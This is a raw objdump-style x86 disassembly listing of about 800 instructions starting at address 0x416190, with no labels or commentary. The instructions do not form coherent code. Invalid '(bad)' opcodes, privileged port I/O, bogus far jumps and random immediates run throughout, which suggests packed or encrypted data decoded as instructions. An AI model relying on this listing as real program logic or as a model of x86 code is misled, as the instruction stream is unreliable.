  416190:	shl    DWORD PTR [eax-0x68],cl
  416193:	and    BYTE PTR [esi+eax*4-0xa],0x8
  416198:	cmp    al,0x6b
  41619a:	addr16 jge 0x41621a
  41619d:	ret    
  41619e:	xchg   ebx,edi
  4161a0:	dec    esi
  4161a1:	fcom   DWORD PTR [ebx]
  4161a3:	add    BYTE PTR [esi-0xdb82fd4],0xde
  4161aa:	ja     0x4161e6
  4161ac:	int3   
  4161ad:	adc    eax,0x29d20b2d
  4161b2:	js     0x416231
  4161b4:	jge    0x4161d0
  4161b6:	rcr    DWORD PTR [eax+0x42440e99],0xdd
  4161bd:	jmp    0x9e4a3a5
  4161c2:	sub    eax,0xa3059827
  4161c7:	in     eax,0xa5
  4161c9:	into   
  4161ca:	adc    eax,0xf44aab6
  4161cf:	inc    esp
  4161d0:	jae    0x416170
  4161d2:	pop    edx
  4161d3:	stc    
  4161d4:	jbe    0x4161d3
  4161d6:	add    cl,BYTE PTR [ecx]
  4161d8:	sbb    eax,DWORD PTR [esi-0x4]
  4161db:	and    al,0x9c
  4161dd:	loop   0x4161cf
  4161df:	push   eax
  4161e0:	jle    0x41619f
  4161e2:	jecxz  0x416212
  4161e4:	cmp    eax,0x28ed85dd
  4161e9:	ins    BYTE PTR es:[edi],dx
  4161ea:	push   0x4
  4161ec:	add    eax,0x30f4f36c
  4161f1:	in     al,dx
  4161f2:	fs dec esi
  4161f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161f5:	(bad)  [esi+0x2e527b5a]
  4161fb:	cli    
  4161fc:	cmp    esp,DWORD PTR [esi]
  4161fe:	inc    eax
  4161ff:	arpl   WORD PTR [ebp+eiz*8+0x1d680617],ax
  416206:	push   ss
  416207:	mov    esp,0xb4aec10b
  41620c:	cli    
  41620d:	mov    ss,WORD PTR [eax-0x33175287]
  416213:	mov    ebp,0xec7a0481
  416218:	clc    
  416219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41621a:	inc    ebp
  41621b:	je     0x416274
  41621d:	sub    eax,0x322cca2c
  416222:	cdq    
  416223:	dec    esp
  416224:	ins    BYTE PTR es:[edi],dx
  416225:	push   eax
  416226:	cmp    edi,DWORD PTR [edx+0x623ec492]
  41622c:	stc    
  41622d:	pushf  
  41622e:	in     eax,0x93
  416230:	dec    esi
  416231:	sub    ecx,DWORD PTR [edi]
  416233:	xor    DWORD PTR [esi],ebx
  416235:	fisttp QWORD PTR [edi+ecx*1-0x15]
  416239:	dec    ebp
  41623a:	dec    edx
  41623b:	lea    ebp,[eax-0x4a]
  41623e:	adc    al,dh
  416240:	int    0xfe
  416242:	loope  0x416212
  416244:	retf   0xbcd9
  416247:	shr    DWORD PTR [esp+ecx*1+0x1607138],0x9a
  41624f:	push   edi
  416251:	pop    ecx
  416252:	test   eax,0x6607d7c5
  416257:	stc    
  416258:	das    
  416259:	mov    ss,WORD PTR [eax+ebp*2+0x4d]
  41625d:	imul   edi,DWORD PTR [edi],0x64
  416260:	add    DWORD PTR [edi+eax*2+0x4568b787],esi
  416267:	jnp    0x416208
  416269:	mov    bh,0x52
  41626b:	mov    cl,0xb8
  41626d:	mov    dh,0x4b
  41626f:	mov    cl,BYTE PTR [ecx]
  416271:	repz aaa 
  416273:	inc    esi
  416274:	mov    edi,0x7e3af405
  416279:	add    dl,dh
  41627b:	inc    eax
  41627c:	or     DWORD PTR [ebx-0x6ad7431],ebp
  416282:	xchg   edi,eax
  416283:	daa    
  416284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416285:	lods   al,BYTE PTR ds:[esi]
  416286:	popa   
  416287:	adc    cl,BYTE PTR [eax-0x3657e52d]
  41628d:	ja     0x41622e
  41628f:	xchg   ebp,eax
  416290:	push   0xcf39c575
  416295:	xchg   esp,eax
  416296:	sub    DWORD PTR [ecx],0xbcf4388e
  41629c:	mov    DWORD PTR [edx+0x1c083c46],eax
  4162a2:	inc    ebx
  4162a3:	sub    eax,0x6aea2b43
  4162a8:	pop    eax
  4162a9:	lods   al,BYTE PTR ds:[esi]
  4162aa:	inc    BYTE PTR [esi]
  4162ac:	xor    DWORD PTR [ebp+0x6cb7dd2b],0x28ea793b
  4162b6:	fdivr  QWORD PTR [edi+edi*2-0x57]
  4162ba:	or     ebp,edi
  4162bc:	pop    ss
  4162bd:	pop    edi
  4162be:	inc    edi
  4162bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162c0:	je     0x41628f
  4162c2:	mov    esi,0xa9f514d5
  4162c7:	(bad)  
  4162c9:	cld    
  4162ca:	pop    edx
  4162cb:	jmp    0x41628d
  4162cd:	pushf  
  4162ce:	fmul   DWORD PTR [esi-0x325bca1a]
  4162d4:	std    
  4162d5:	shl    BYTE PTR [ebx-0x16],0x95
  4162d9:	in     al,dx
  4162da:	imul   ebp,DWORD PTR [ebx+0x70b61785],0xa
  4162e1:	scas   al,BYTE PTR es:[edi]
  4162e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162e3:	lods   eax,DWORD PTR ds:[esi]
  4162e4:	and    DWORD PTR [edx+eiz*1],edx
  4162e7:	mov    bh,0x16
  4162e9:	icebp  
  4162ea:	out    dx,eax
  4162eb:	call   0x71a83f20
  4162f0:	push   0x64dd1cc8
  4162f5:	lds    ebx,FWORD PTR [ebx+ebx*4]
  4162f8:	cli    
  4162f9:	xchg   ebp,eax
  4162fa:	jb     0x416369
  4162fc:	in     eax,dx
  4162fd:	and    ebp,DWORD PTR [esi+0x4c]
  416300:	cmp    al,0xca
  416302:	cmc    
  416303:	mov    edx,0xef387465
  416308:	xor    eax,0xa4487fcc
  41630d:	jo     0x41631a
  41630f:	mov    ebp,0x7a4db6f9
  416314:	xor    DWORD PTR [eax-0x10],ebp
  416317:	mov    esp,0x90b78f61
  41631c:	or     BYTE PTR [eax-0x6c],ch
  41631f:	stos   BYTE PTR es:[edi],al
  416320:	lods   al,BYTE PTR ds:[esi]
  416321:	lahf   
  416322:	sbb    BYTE PTR [ebx-0x5f6298be],0x58
  416329:	data16 mov al,ds:0x6e9ab04d
  41632f:	mov    al,ds:0x4f23c977
  416334:	pop    esp
  416335:	jg     0x416354
  416337:	push   eax
  416338:	sahf   
  416339:	xchg   DWORD PTR ds:0xe574da46,ebx
  41633f:	fcmovnb st,st(3)
  416341:	aaa    
  416342:	jecxz  0x416383
  416344:	and    BYTE PTR [edi],ch
  416346:	and    DWORD PTR [ecx-0x4b],esp
  416349:	es mov dl,0x5a
  41634c:	ror    BYTE PTR [ebx-0x36],0x8
  416350:	test   eax,0xff92efd7
  416355:	push   ss
  416356:	pop    es
  416357:	pop    es
  416358:	push   ds
  416359:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41635b:	fisttp WORD PTR [ecx-0x398ddee5]
  416361:	xchg   bh,dh
  416363:	in     eax,0x22
  416365:	or     cl,BYTE PTR [ebp-0x22]
  416368:	dec    ecx
  416369:	cmp    eax,0x75aa5a0b
  41636e:	aad    0xc9
  416370:	retf   0x8c22
  416373:	dec    ecx
  416374:	sbb    DWORD PTR [eax-0x19],eax
  416377:	adc    al,0xd6
  416379:	mov    eax,ds:0x6bd90395
  41637e:	fs jns 0x416304
  416381:	cmp    DWORD PTR ds:0xc6f230d5,ebp
  416387:	cmp    DWORD PTR [ebx-0x7c],esp
  41638a:	cmp    bl,BYTE PTR [esp+edx*4+0x6d]
  41638e:	mov    eax,ds:0x1d42c9e8
  416393:	pop    ecx
  416394:	imul   esi,DWORD PTR [edi+ebx*1-0x2e38e157],0x1d6665e9
  41639f:	adc    cl,BYTE PTR [esi]
  4163a1:	(bad)  
  4163a2:	adc    eax,0xe67b4b49
  4163a7:	clc    
  4163a8:	add    BYTE PTR [ebx],cl
  4163aa:	fstp   TBYTE PTR [eax+eax*4+0x27]
  4163ae:	add    al,0x44
  4163b0:	jle    0x416358
  4163b2:	(bad)  
  4163b3:	add    DWORD PTR [ebx+0x78],esp
  4163b6:	aad    0x61
  4163b8:	shl    DWORD PTR [edi+0x1f],1
  4163bb:	call   0xc907febd
  4163c0:	mov    WORD PTR [ebx-0x2e6103a1],?
  4163c6:	into   
  4163c7:	div    DWORD PTR [ecx+0x4eb7bed8]
  4163cd:	inc    edx
  4163ce:	jmp    0xdd8c:0xca493b50
  4163d5:	pop    ebp
  4163d6:	sbb    DWORD PTR [eax-0x408a4013],esp
  4163dc:	call   0x2088:0x93d4a5e8
  4163e3:	fisubr DWORD PTR [ecx-0x49f4e43f]
  4163e9:	addr16 gs pop esi
  4163ec:	or     esp,DWORD PTR [edx+esi*8+0x3c6d3bee]
  4163f3:	jmp    0xd641dc7
  4163f8:	mov    ah,bl
  4163fa:	mov    edi,0xe8df5b61
  4163ff:	jl     0x2caf8bab
  416405:	jl     0x416396
  416407:	mov    ebx,0xf33fcccc
  41640c:	mov    bl,0xb6
  41640e:	aad    0x1b
  416410:	int    0x1c
  416412:	pop    esp
  416413:	push   ecx
  416414:	lahf   
  416415:	add    al,0xdd
  416417:	xor    edx,edx
  416419:	into   
  41641a:	neg    DWORD PTR [esi+0x714b31e2]
  416420:	pop    esi
  416421:	jno    0x416416
  416423:	inc    esi
  416424:	pop    ss
  416425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416426:	(bad)  
  416427:	out    dx,eax
  416428:	int    0x62
  41642a:	(bad)  
  41642b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41642c:	(bad)  
  41642d:	cmp    esi,esp
  41642f:	sbb    DWORD PTR [eax-0x7cd5431b],edi
  416435:	lea    ebx,[ecx]
  416437:	dec    ebx
  416438:	jbe    0x41647a
  41643a:	add    bl,dl
  41643c:	jmp    0x41643c
  41643e:	or     eax,0xb2a04c04
  416443:	outs   dx,BYTE PTR ds:[esi]
  416444:	push   ecx
  416445:	xlat   BYTE PTR ds:[ebx]
  416446:	mov    bh,0x29
  416448:	push   ds
  416449:	dec    ebx
  41644a:	call   0xc357:0xe86c2bb6
  416451:	ss in  al,0x8f
  416454:	ja     0x4163d7
  416456:	das    
  416457:	das    
  416458:	stos   BYTE PTR es:[edi],al
  416459:	retf   
  41645a:	or     al,0x87
  41645c:	arpl   WORD PTR [ecx],cx
  41645e:	loope  0x41649b
  416460:	loope  0x4164a6
  416462:	inc    edx
  416463:	jmp    0xa01f:0x9a541b8d
  41646a:	xor    DWORD PTR [ebp-0x4d],ecx
  41646d:	inc    esp
  41646e:	xchg   ebp,eax
  41646f:	adc    ch,BYTE PTR [ebp-0x61]
  416472:	mov    bh,0x8
  416474:	xchg   ecx,eax
  416475:	add    eax,0xaf7360b3
  41647a:	cwde   
  41647b:	(bad)  
  41647c:	inc    eax
  41647d:	adc    BYTE PTR [edx-0x36],dh
  416480:	nop
  416481:	and    esi,edx
  416483:	sbb    bh,BYTE PTR [ebx-0x6276975]
  416489:	xor    edi,DWORD PTR [edx-0xc]
  41648c:	outs   dx,DWORD PTR ds:[esi]
  41648d:	clc    
  41648e:	push   edi
  41648f:	popf   
  416490:	push   es
  416491:	daa    
  416492:	leave  
  416493:	jl     0x4164dd
  416495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416496:	(bad)  
  416497:	leave  
  416498:	pop    es
  416499:	add    BYTE PTR [edx],dh
  41649b:	sbb    eax,0x7f4711bd
  4164a0:	xor    al,0x78
  4164a2:	(bad)  
  4164a3:	adc    bl,bl
  4164a5:	sub    edx,DWORD PTR [eax]
  4164a7:	rcr    dl,0x1c
  4164aa:	stc    
  4164ab:	loopne 0x416470
  4164ad:	outs   dx,DWORD PTR ds:[esi]
  4164ae:	cs int 0xf6
  4164b1:	popa   
  4164b2:	mov    edi,0xc5c4d8b7
  4164b7:	(bad)  
  4164b8:	nop
  4164b9:	xchg   ebp,eax
  4164ba:	ja     0x41649e
  4164bc:	jg     0x4164e7
  4164be:	clc    
  4164bf:	sub    eax,0x1eb8e2be
  4164c4:	pusha  
  4164c5:	(bad)  
  4164c7:	jnp    0x416508
  4164c9:	imul   eax,DWORD PTR [edx],0xe74ec881
  4164cf:	int    0x7a
  4164d1:	test   BYTE PTR [ecx+0x27],ch
  4164d4:	repnz push es
  4164d6:	add    BYTE PTR [esi-0x5d75c954],al
  4164dc:	lahf   
  4164dd:	ret    
  4164de:	mov    edi,0x237b4490
  4164e3:	mov    ah,0x69
  4164e5:	xor    eax,0x4c9e414
  4164ea:	xchg   BYTE PTR [esi+0x11],cl
  4164ed:	gs mov esi,cs
  4164f0:	jae    0x416558
  4164f2:	inc    ecx
  4164f3:	pop    ds
  4164f4:	jne    0x41653f
  4164f6:	and    eax,0xc08d7d6d
  4164fb:	xor    DWORD PTR [edi+0x55],eax
  4164fe:	iret   
  4164ff:	jae    0x416492
  416501:	pop    ebp
  416502:	mov    ah,ch
  416504:	jg     0x416557
  416506:	les    ecx,FWORD PTR [edi]
  416508:	out    dx,eax
  416509:	ret    0xa8ee
  41650c:	push   es
  41650d:	or     al,0xa8
  41650f:	scas   eax,DWORD PTR es:[edi]
  416510:	hlt    
  416511:	inc    ecx
  416512:	cmp    eax,0xcb12e24f
  416517:	sbb    ecx,ecx
  416519:	mov    ecx,ebx
  41651b:	pop    ebp
  41651c:	xor    DWORD PTR [ebx-0x39],edx
  41651f:	push   ss
  416520:	out    dx,al
  416521:	out    0x13,al
  416523:	fwait
  416524:	mov    al,0xa2
  416526:	shr    DWORD PTR [ebx+edi*4-0x7dc1a836],0x35
  41652e:	dec    esi
  41652f:	dec    edi
  416530:	xor    al,0x36
  416532:	pop    ds
  416533:	mov    ds:0xf3d5ab5e,eax
  416538:	pop    ds
  416539:	cmp    al,0xaa
  41653b:	(bad)  
  41653c:	mov    ebp,0x34057d57
  416541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416542:	rcr    cl,cl
  416544:	pop    eax
  416545:	mov    al,ds:0x3566fccc
  41654a:	add    cl,ah
  41654c:	xor    al,0x38
  41654e:	repz call 0xbe1b:0xbe96ed8e
  416556:	jecxz  0x4164e5
  416558:	pushf  
  416559:	inc    edi
  41655a:	test   al,0xba
  41655c:	cli    
  41655d:	jno    0x41654e
  41655f:	cli    
  416560:	int3   
  416561:	jle    0x4165d7
  416563:	jg     0x4165c3
  416565:	sbb    ebx,edi
  416567:	js     0x4164f1
  416569:	and    al,0x6f
  41656b:	mov    cl,0xea
  41656d:	in     al,dx
  41656e:	mov    dl,0xd2
  416570:	stos   BYTE PTR es:[edi],al
  416571:	cdq    
  416572:	pusha  
  416573:	xor    al,0x7e
  416575:	call   0xfe0f3a50
  41657a:	popf   
  41657b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41657c:	mov    esp,0x461f7806
  416581:	int3   
  416582:	push   es
  416583:	inc    ecx
  416584:	out    dx,al
  416585:	adc    dl,dl
  416587:	sub    BYTE PTR ds:0x86dd70ad,al
  41658d:	retf   0xbfd9
  416590:	lds    edx,FWORD PTR [ecx]
  416592:	and    BYTE PTR [edi-0x3b],0x35
  416596:	push   ecx
  416597:	test   BYTE PTR [eax-0x605e50a2],dl
  41659d:	lods   eax,DWORD PTR ds:[esi]
  41659e:	aas    
  41659f:	rcr    esi,0x38
  4165a2:	cmp    bh,BYTE PTR [ebp+0x3f]
  4165a5:	inc    edi
  4165a6:	retf   
  4165a7:	add    edx,esi
  4165a9:	xchg   BYTE PTR [eax-0x5f55d6e9],ch
  4165af:	sbb    ah,BYTE PTR [eax-0x40817696]
  4165b5:	adc    ebx,DWORD PTR [edi+0x4d30ce6e]
  4165bb:	cmp    al,0xba
  4165bd:	pop    ebp
  4165be:	push   ebp
  4165bf:	enter  0xc8f0,0x4e
  4165c3:	repz clc 
  4165c5:	shr    BYTE PTR [eax],1
  4165c7:	out    0x1e,al
  4165c9:	out    dx,eax
  4165ca:	lock outs dx,DWORD PTR ds:[esi]
  4165cc:	jge    0x416566
  4165ce:	ds sub al,0xa2
  4165d1:	in     al,0x8f
  4165d3:	mov    al,ds:0x6778338e
  4165d8:	mov    BYTE PTR [eax+eiz*8-0x6354f29d],ah
  4165df:	scas   eax,DWORD PTR es:[edi]
  4165e0:	sub    al,0x19
  4165e2:	call   0x2d3da3f
  4165e7:	push   cs
  4165e8:	mov    ah,0x4
  4165ea:	sub    ch,ch
  4165ec:	retf   0xdc84
  4165ef:	ss push ss
  4165f1:	pop    edx
  4165f2:	jg     0x416657
  4165f4:	mov    edx,0x3b1b832e
  4165f9:	xchg   edx,eax
  4165fa:	gs stc 
  4165fc:	sbb    BYTE PTR [edi+0x3],cl
  4165ff:	sub    eax,0x90fe7bf1
  416604:	push   cs
  416605:	jmp    0x4e92:0xdec94b5f
  41660c:	call   0xc5c2:0x295c0c55
  416613:	(bad)  
  416614:	iret   
  416615:	sahf   
  416616:	sbb    BYTE PTR [esp+edx*1],ch
  416619:	mov    DWORD PTR [ebp+0x69767e80],esi
  41661f:	mov    ebp,0xf36e1756
  416624:	sbb    DWORD PTR [ecx-0x6a],esi
  416627:	add    al,0xc1
  416629:	mov    ah,BYTE PTR [ecx+edi*2-0x5828b055]
  416630:	ins    DWORD PTR es:[edi],dx
  416631:	sub    al,0xc5
  416633:	cmp    BYTE PTR [esi],dl
  416635:	dec    edi
  416636:	add    al,0xd3
  416638:	and    eax,0x61b97aae
  41663d:	ins    BYTE PTR es:[edi],dx
  41663e:	mov    cl,0x24
  416640:	ret    0x9046
  416643:	iret   
  416644:	cmp    eax,0xb9b7d01a
  416649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41664a:	adc    al,0x1b
  41664c:	icebp  
  41664d:	cld    
  41664e:	mov    esp,0x7529ae2a
  416653:	clc    
  416654:	cmp    eax,0x1a4b72c4
  416659:	mov    al,0x7d
  41665b:	retf   0x457a
  41665e:	data16 (bad) 
  416660:	data16 bnd jge 0x416633
  416664:	or     DWORD PTR [ecx],ebx
  416666:	ror    DWORD PTR [edx+0x3c9c6716],cl
  41666c:	mov    bh,0x4
  41666e:	jmp    0xf04d:0xc4e8ac52
  416675:	sub    cl,0xee
  416678:	or     edi,DWORD PTR ds:0x16828608
  41667e:	mov    al,ds:0x976e3111
  416683:	cmp    ebp,DWORD PTR [ebp-0x62]
  416686:	sub    bl,BYTE PTR [ebx+ebp*1+0x43]
  41668a:	and    eax,0xbcd5f158
  41668f:	mov    ah,BYTE PTR [esi+0x6ed59ab9]
  416695:	and    al,0x34
  416697:	sahf   
  416698:	mov    al,ds:0xa4651067
  41669d:	sbb    dh,ch
  41669f:	popa   
  4166a0:	shr    DWORD PTR [ecx-0x4724dc1d],0x25
  4166a7:	mov    al,0x32
  4166a9:	fstp   DWORD PTR [eax+0x22]
  4166ac:	push   es
  4166ad:	xor    al,0xb0
  4166af:	cmp    ebx,ebx
  4166b1:	adc    eax,0xa455adbb
  4166b6:	inc    ebx
  4166b7:	xchg   esp,eax
  4166b8:	mov    bh,0x93
  4166ba:	cmp    eax,ebp
  4166bc:	int    0x54
  4166be:	fdivrp st(4),st
  4166c0:	cmp    DWORD PTR [edx-0x61],esp
  4166c3:	test   ebp,ebx
  4166c5:	ret    0x6e7d
  4166c8:	mov    dh,0x5e
  4166ca:	call   0xe57932a1
  4166cf:	mov    eax,0xb5154d7f
  4166d4:	or     ah,BYTE PTR [ecx+0x75]
  4166d7:	xchg   ecx,eax
  4166d8:	ja     0x4166e4
  4166da:	cmp    DWORD PTR [edx+ecx*2+0xf8fa2d0],esp
  4166e1:	loop   0x416709
  4166e3:	popf   
  4166e4:	and    eax,0xb86d0a1b
  4166e9:	push   cs
  4166ea:	mov    DWORD PTR [edi-0x77dc9f9a],esi
  4166f0:	pop    edx
  4166f1:	add    DWORD PTR [edx+0x8],0xffffffc5
  4166f5:	jmp    0x4166fd
  4166f7:	add    esp,DWORD PTR [edi-0x64]
  4166fa:	test   al,0xc6
  4166fc:	retf   
  4166fd:	or     BYTE PTR [ebx+0x5d],cl
  416700:	dec    edi
  416701:	jns    0x416763
  416703:	addr16 das 
  416705:	mov    esi,0x313d7b8d
  41670a:	push   esp
  41670b:	cmp    al,0x4e
  41670d:	mov    al,0xe0
  41670f:	jno    0x4166ee
  416711:	inc    esi
  416712:	enter  0x225a,0x15
  416716:	fwait
  416717:	in     al,0xff
  416719:	int    0xe7
  41671b:	push   0x8c8f2a0a
  416720:	add    edi,DWORD PTR [edi]
  416722:	push   eax
  416723:	jnp    0x41678e
  416725:	and    DWORD PTR [ecx-0x65d67f40],ecx
  41672b:	dec    esi
  41672c:	sub    BYTE PTR [esi],cl
  41672e:	pop    ebx
  41672f:	test   al,al
  416731:	(bad)  
  416732:	mov    ebp,0x854bef69
  416737:	gs mov esi,0xa7548603
  41673d:	mov    ch,0x49
  41673f:	and    al,BYTE PTR [edx]
  416741:	dec    esi
  416742:	bound  ebp,QWORD PTR [ebx+0x7a4c4b07]
  416748:	inc    edi
  416749:	inc    ebp
  41674a:	and    dh,BYTE PTR [esi-0x15]
  41674d:	aad    0xd4
  41674f:	sbb    esi,ecx
  416751:	xor    al,0xe5
  416753:	mov    bh,0x9a
  416755:	pusha  
  416756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416757:	popf   
  416758:	hlt    
  416759:	dec    ecx
  41675a:	shl    BYTE PTR [edx+ebx*4+0x16],0xff
  41675f:	mov    esi,DWORD PTR [esi]
  416761:	mov    edi,0xcb4fbf5c
  416766:	sub    al,0xa4
  416768:	inc    ecx
  416769:	popa   
  41676a:	mov    al,0x75
  41676c:	pop    ss
  41676d:	gs adc al,0x1c
  416770:	push   ecx
  416771:	mov    ds:0xd8f34219,al
  416776:	adc    BYTE PTR [esi],bh
  416778:	repz mov ecx,0x9e34a316
  41677e:	sti    
  41677f:	inc    ebx
  416780:	xor    al,0x97
  416782:	icebp  
  416783:	xchg   ebx,eax
  416784:	and    al,0x89
  416786:	cmp    ch,BYTE PTR [edx+0x2d]
  416789:	dec    ecx
  41678a:	xchg   DWORD PTR [ebx+eiz*2],esp
  41678d:	xor    bl,cl
  41678f:	jge    0x41677e
  416791:	cs mov edi,0xd737b6d5
  416797:	loop   0x416787
  416799:	call   0x1819099f
  41679e:	sysenter 
  4167a0:	or     eax,0x1e9d0abc
  4167a5:	(bad)
  4167a8:	sbb    eax,0xd86fa3a4
  4167ad:	add    dh,BYTE PTR [esi]
  4167af:	sub    DWORD PTR [ebx],eax
  4167b1:	jp     0x4167d1
  4167b3:	out    dx,eax
  4167b4:	push   ebx
  4167b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167b6:	xor    eax,DWORD PTR [ebp-0x20]
  4167b9:	mov    ds:0xedbf3101,al
  4167be:	mov    DWORD PTR [edi+ebx*2],ebx
  4167c1:	sbb    edx,DWORD PTR [ebx]
  4167c3:	call   0x338e04c3
  4167c8:	cs pop es
  4167ca:	pop    ecx
  4167cb:	mov    ah,0xd4
  4167cd:	das    
  4167ce:	push   edi
  4167cf:	rol    BYTE PTR [eax-0x33],0x1a
  4167d3:	stos   BYTE PTR es:[edi],al
  4167d4:	test   BYTE PTR [edx+0x35],dl
  4167d7:	loope  0x416805
  4167d9:	dec    ecx
  4167da:	or     ah,bl
  4167dc:	xor    al,0x88
  4167de:	adc    al,0x80
  4167e0:	std    
  4167e1:	push   eax
  4167e2:	fnstsw WORD PTR [ebp+0x7]
  4167e5:	ja     0x41678d
  4167e7:	mov    bl,0x96
  4167e9:	push   cs
  4167ea:	(bad)  
  4167ec:	and    BYTE PTR [ebp+0x2c],ah
  4167ef:	mov    eax,0xd7b445d3
  4167f4:	jge    0x41685c
  4167f6:	and    DWORD PTR [edi],edi
  4167f8:	lods   eax,DWORD PTR ds:[esi]
  4167f9:	shl    BYTE PTR [ecx-0x7114683c],cl
  4167ff:	pop    ss
  416800:	xor    dl,dl
  416802:	call   0x104a:0xccd610f7
  416809:	in     al,0x69
  41680b:	ror    DWORD PTR cs:[ebp+0x491cbe6d],1
  416812:	mov    ecx,0xa15c052f
  416817:	inc    ebx
  416818:	sub    ecx,ebp
  41681a:	in     eax,0xc1
  41681c:	xchg   ecx,eax
  41681d:	xlat   BYTE PTR ds:[ebx]
  41681e:	add    esp,edx
  416820:	jle    0x416895
  416822:	test   BYTE PTR ds:0x2fedb9cc,ah
  416828:	push   0x3b
  41682a:	push   ecx
  41682b:	cmp    DWORD PTR [eax+edi*2],edx
  41682e:	cmp    al,0x61
  416830:	inc    ecx
  416831:	sbb    edx,edx
  416833:	std    
  416834:	mov    al,0xfc
  416836:	outs   dx,BYTE PTR ds:[esi]
  416837:	push   es
  416838:	dec    ecx
  416839:	sbb    dh,dl
  41683b:	addr16 xchg ecx,eax
  41683d:	lods   eax,DWORD PTR ds:[esi]
  41683e:	popf   
  41683f:	loopne 0x4167ea
  416841:	or     eax,0x4c5ea4d3
  416846:	adc    al,0x1d
  416848:	outs   dx,BYTE PTR ds:[esi]
  416849:	jecxz  0x416830
  41684b:	leave  
  41684c:	loop   0x416822
  41684e:	mov    al,ds:0x80688686
  416853:	adc    BYTE PTR [edx-0x3e11a1e],bl
  416859:	push   esp
  41685a:	jns    0x4167ed
  41685c:	out    0x22,al
  41685e:	jle    0x4168cc
  416860:	mov    BYTE PTR [ecx-0x38d4422],cl
  416866:	mov    dl,0xc3
  416868:	(bad)
  41686b:	rol    DWORD PTR [ebx+0x37],cl
  41686e:	inc    edi
  41686f:	out    0xca,al
  416871:	add    bh,BYTE PTR [eax-0x215afee2]
  416877:	push   cs
  416878:	mov    ds:0x2ef2c4e9,eax
  41687d:	je     0x416890
  41687f:	xlat   BYTE PTR ds:[ebx]
  416881:	cmp    eax,0x55f8c9b2
  416886:	mov    dl,0x69
  416888:	retf   
  416889:	jnp    0x416895
  41688b:	ret    
  41688c:	dec    esi
  41688d:	dec    edi
  41688e:	or     ebx,DWORD PTR [eax]
  416890:	popf   
  416891:	sti    
  416892:	cmp    DWORD PTR [ecx],esi
  416894:	lods   al,BYTE PTR ds:[esi]
  416895:	fnstenv [ecx+ebp*4-0x7b3a285e]
  41689c:	dec    edi
  41689d:	mov    ecx,0x39e26a84
  4168a2:	mov    bl,0xd
  4168a4:	sub    esp,DWORD PTR [ecx]
  4168a6:	aaa    
  4168a7:	push   0xd26915f9
  4168ac:	sahf   
  4168ad:	pop    esp
  4168ae:	jmp    0x669e313
  4168b3:	adc    bh,BYTE PTR [ebp+0x7f467265]
  4168b9:	pop    edx
  4168ba:	js     0x416840
  4168bc:	jb     0x416876
  4168be:	std    
  4168bf:	xchg   DWORD PTR [ecx-0x2f354fc4],esp
  4168c5:	mov    esi,es
  4168c7:	inc    esp
  4168c8:	and    DWORD PTR [esi+0x109eb2e0],edi
  4168ce:	dec    ecx
  4168cf:	xor    cl,BYTE PTR [esi]
  4168d1:	fistp  WORD PTR [ebx-0x78f09ee1]
  4168d7:	sbb    DWORD PTR [ebp+0x32],ebx
  4168da:	mov    cl,BYTE PTR [edi+0x3f]
  4168dd:	push   edx
  4168de:	dec    edx
  4168df:	sahf   
  4168e0:	fmul   DWORD PTR ds:0xfe1c6438
  4168e6:	(bad)  
  4168e7:	mul    BYTE PTR [esi+eiz*4+0x408d94fc]
  4168ee:	nop
  4168ef:	scas   al,BYTE PTR es:[edi]
  4168f0:	cmp    BYTE PTR [ebx],bl
  4168f2:	ud2    
  4168f4:	xchg   ebp,eax
  4168f5:	lahf   
  4168f6:	in     al,dx
  4168f7:	xchg   ecx,eax
  4168f8:	xor    esp,esi
  4168fa:	xchg   ecx,eax
  4168fb:	loope  0x416932
  4168fd:	dec    DWORD PTR [edx+0x29283539]
  416903:	dec    esi
  416905:	xor    DWORD PTR [eax+0x3c542b2b],esp
  41690b:	aad    0xaa
  41690d:	sub    ebx,DWORD PTR [eax]
  41690f:	mov    cs,WORD PTR [eax+0x15]
  416912:	pop    edx
  416913:	mov    dh,0x79
  416915:	mov    eax,ds:0x2b4164b3
  41691a:	mov    ds:0xaa685f44,al
  41691f:	out    0x8b,eax
  416921:	jno    0x416999
  416923:	ds inc ebx
  416925:	push   ds
  416926:	pop    ds
  416927:	sub    al,0x58
  416929:	in     al,dx
  41692a:	lock cdq 
  41692c:	jge    0x41694e
  41692e:	sub    ch,al
  416930:	sbb    DWORD PTR [edi],0x3d
  416933:	loop   0x416965
  416935:	xchg   ecx,eax
  416936:	add    DWORD PTR [edx+eax*4],esp
  416939:	adc    ah,BYTE PTR [eax]
  41693b:	loopne 0x41696a
  41693d:	mov    dl,0xd4
  41693f:	mov    bh,BYTE PTR [ecx+0x46]
  416942:	inc    edi
  416943:	(bad)  [eax+edi*4-0x29227d0b]
  41694a:	mov    bl,0x6d
  41694c:	dec    ebp
  41694d:	dec    esi
  41694e:	test   DWORD PTR [eax-0x54],ebx
  416951:	mov    ebx,0x3c423700
  416956:	retf   
  416957:	int    0xfa
  416959:	sbb    edx,DWORD PTR [eax]
  41695b:	jo     0x4169b7
  41695d:	repz addr16 mov eax,0x6c6ffe92
  416964:	jae    0x4168ed
  416966:	sub    BYTE PTR [edx],ch
  416968:	adc    ebx,edx
  41696a:	test   dh,dh
  41696c:	sub    al,0xa5
  41696e:	into   
  41696f:	push   0x92f51a0
  416974:	and    DWORD PTR [ebx+edi*8+0x27efc732],esp
  41697b:	push   ss
  41697c:	pop    ebx
  41697d:	xchg   ecx,ebp
  41697f:	ret    0xa7d0
  416982:	jb     0x41699d
  416984:	adc    al,0x6b
  416986:	jnp    0x41692f
  416988:	test   ch,bh
  41698a:	pop    ebx
  41698b:	sti    
  41698c:	(bad)  
  41698d:	mov    BYTE PTR [esi],ah
  41698f:	je     0x4169d1
  416991:	cmp    dl,cl
  416993:	neg    ch
  416995:	mov    ds:0xb3436c1b,al
